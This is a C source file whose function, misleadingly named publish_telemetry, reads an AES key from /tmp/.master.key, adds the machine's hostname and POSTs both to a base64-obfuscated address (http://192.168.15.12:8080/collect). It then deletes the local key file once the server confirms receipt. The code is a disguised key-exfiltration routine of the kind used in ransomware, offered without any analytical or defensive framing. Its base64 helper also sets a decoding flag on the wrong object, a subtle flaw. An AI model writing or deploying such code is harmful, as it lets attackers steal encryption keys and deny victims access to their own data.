#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

/* Base64 decoding function prototype */
char *base64_decode(const char *encoded);

/* Compile-time base64-encoded URL: http://192.168.15.12:8080/collect */
static const char ENCODED_URL[] = 
    "aHR0cDovLzE5Mi4xNjguMTUuMTI6ODA4MC9jb2xsZWN0";

void publish_telemetry(void) {
    FILE *fp = NULL;
    char *file_buf = NULL;
    long file_size = 0;
    char *key_start = NULL, *key_end = NULL;
    char *aes_key = NULL;
    char hostname[256] = "unknown";
    char *json_body = NULL;
    char *decoded_url = NULL;
    CURL *curl = NULL;
    CURLcode res;
    long http_code = 0;
    struct curl_slist *headers = NULL;
    size_t json_len = 0;

    /* Step 1: Open and read key file */
    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        perror("Failed to open key file");
        return;
    }

    /* Get file size */
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("Failed to seek to end of file");
        fclose(fp);
        return;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        perror("Failed to get file size");
        fclose(fp);
        return;
    }
    rewind(fp);

    /* Allocate buffer and read file */
    file_buf = malloc(file_size + 1);
    if (!file_buf) {
        perror("Failed to allocate memory for file");
        fclose(fp);
        return;
    }

    if (fread(file_buf, 1, file_size, fp) != (size_t)file_size) {
        fprintf(stderr, "Failed to read complete file\n");
        free(file_buf);
        fclose(fp);
        return;
    }
    file_buf[file_size] = '\0';
    fclose(fp);
    fp = NULL;

    /* Step 2: Extract AES key from JSON */
    const char *key_field = "\"aes_key\"";
    char *field_pos = strstr(file_buf, key_field);
    if (!field_pos) {
        fprintf(stderr, "Field 'aes_key' not found in key file\n");
        free(file_buf);
        return;
    }

    /* Find the colon after field name */
    char *colon = strchr(field_pos + strlen(key_field), ':');
    if (!colon) {
        fprintf(stderr, "Malformed key field\n");
        free(file_buf);
        return;
    }

    /* Find opening quote */
    char *open_quote = strchr(colon + 1, '"');
    if (!open_quote) {
        fprintf(stderr, "Missing opening quote for key value\n");
        free(file_buf);
        return;
    }

    /* Find closing quote */
    key_start = open_quote + 1;
    const char *close_quote = strchr(key_start, '"');
    if (!close_quote) {
        fprintf(stderr, "Missing closing quote for key value\n");
        free(file_buf);
        return;
    }

    size_t key_len = close_quote - key_start;
    aes_key = malloc(key_len + 1);
    if (!aes_key) {
        perror("Failed to allocate memory for AES key");
        free(file_buf);
        return;
    }
    strncpy(aes_key, key_start, key_len);
    aes_key[key_len] = '\0';

    /* Step 3: Get hostname */
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strcpy(hostname, "unknown");
    }
    hostname[sizeof(hostname) - 1] = '\0';

    /* Step 4: Build JSON body */
    size_t hostname_len = strlen(hostname);
    size_t max_json_len = strlen("{\"aes_key\":\"\",\"hostname\":\"\"}") + 
                          key_len * 2 + hostname_len * 2 + 1; /* Worst-case with escaping */
    
    json_body = malloc(max_json_len);
    if (!json_body) {
        perror("Failed to allocate memory for JSON body");
        free(aes_key);
        free(file_buf);
        return;
    }

    /* Build JSON with escaping */
    char *p = json_body;
    size_t remaining = max_json_len;
    int written = snprintf(p, remaining, "{\"aes_key\":\"");
    if (written < 0 || (size_t)written >= remaining) {
        fprintf(stderr, "Failed to format JSON\n");
        goto cleanup;
    }
    p += written;
    remaining -= written;

    /* Escape key */
    for (const char *src = aes_key; *src && remaining > 0; src++) {
        if (*src == '"' || *src == '\\') {
            if (remaining < 2) break;
            *p++ = '\\';
            remaining--;
        }
        *p++ = *src;
        remaining--;
    }

    written = snprintf(p, remaining, "\",\"hostname\":\"");
    if (written < 0 || (size_t)written >= remaining) {
        fprintf(stderr, "Failed to format JSON\n");
        goto cleanup;
    }
    p += written;
    remaining -= written;

    /* Escape hostname */
    for (const char *src = hostname; *src && remaining > 0; src++) {
        if (*src == '"' || *src == '\\') {
            if (remaining < 2) break;
            *p++ = '\\';
            remaining--;
        }
        *p++ = *src;
        remaining--;
    }

    written = snprintf(p, remaining, "\"}");
    if (written < 0 || (size_t)written >= remaining) {
        fprintf(stderr, "Failed to format JSON\n");
        goto cleanup;
    }

    /* Step 5: Decode URL */
    decoded_url = base64_decode(ENCODED_URL);
    if (!decoded_url) {
        fprintf(stderr, "Failed to decode URL\n");
        goto cleanup;
    }

    /* Step 6: Send HTTP POST via libcurl */
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize libcurl\n");
        goto cleanup;
    }

    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "Failed to create HTTP headers\n");
        goto cleanup;
    }

    curl_easy_setopt(curl, CURLOPT_URL, decoded_url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Curl request failed: %s\n", curl_easy_strerror(res));
        goto cleanup;
    }

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    /* Step 7: Conditionally delete key file */
    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("Failed to delete key file");
        }
    }

cleanup:
    /* Step 8: Cleanup */
    if (curl) {
        curl_easy_cleanup(curl);
    }
    if (headers) {
        curl_slist_free_all(headers);
    }
    curl_global_cleanup();
    free(decoded_url);
    free(json_body);
    free(aes_key);
    free(file_buf);
    return;
}

/* Base64 decode implementation using OpenSSL */
char *base64_decode(const char *encoded) {
    if (!encoded) return NULL;
    
    size_t input_len = strlen(encoded);
    size_t output_len = (input_len * 3) / 4;
    unsigned char *decoded = malloc(output_len + 1);
    if (!decoded) return NULL;

    BIO *bio, *b64;
    size_t total = 0;

    bio = BIO_new_mem_buf(encoded, -1);
    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_push(b64, bio);

    total = BIO_read(bio, decoded, input_len);
    decoded[total] = '\0';

    BIO_free_all(bio);
    
    if (total == 0) {
        free(decoded);
        return NULL;
    }

    return (char *)decoded;
}